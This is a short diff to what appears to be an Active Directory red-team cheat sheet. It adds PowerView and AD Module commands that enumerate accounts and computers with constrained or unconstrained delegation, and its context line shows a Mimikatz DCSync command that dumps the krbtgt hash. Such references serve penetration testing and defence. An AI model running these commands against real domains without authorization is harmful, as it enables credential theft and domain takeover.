@@ -522,3 +522,18 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\krbtgt"'
 ```
 
 ### Constrained Delegation
+
+**1. With Powerview version dev:**
+```powershell
+# Users enumeration
+Get-DomainUser -TrustedToAuth
+# Computers Enumeration
+Get-DomainComputer -TrustedToAuth
+# Search for domain computers with unconstrained delegation enabled from property dnshostname
+Get-NetComputer -Unconstrained | select -ExpandProperty dnshostname
+```
+**2. With AD Module:**
+```powershell
+# Enumeration users and computers with constrained delegation enabled
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+```
